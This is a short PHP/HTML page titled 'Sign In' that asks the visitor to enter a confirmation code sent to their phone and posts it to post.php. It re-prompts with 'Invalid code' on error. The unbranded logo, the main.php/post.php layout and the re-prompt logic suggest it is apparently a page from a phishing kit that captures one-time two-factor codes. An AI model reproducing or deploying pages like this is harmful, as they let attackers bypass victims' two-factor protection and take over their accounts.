<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png">
</header>

<main>
<div class="form">
<div class="title">Confirmation</div>
<div class="text">Please submit the code sent to your phone number to continue.</div>

<form action="post.php" method="post">
<div class="col">
    <input type="text" name="otp" required placeholder="Confirmation code">
    <?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>
</div>

<div class="col">
    <button type="submit">Continue</button>
</div>
</form>



</div>
</main>

</body>
</html>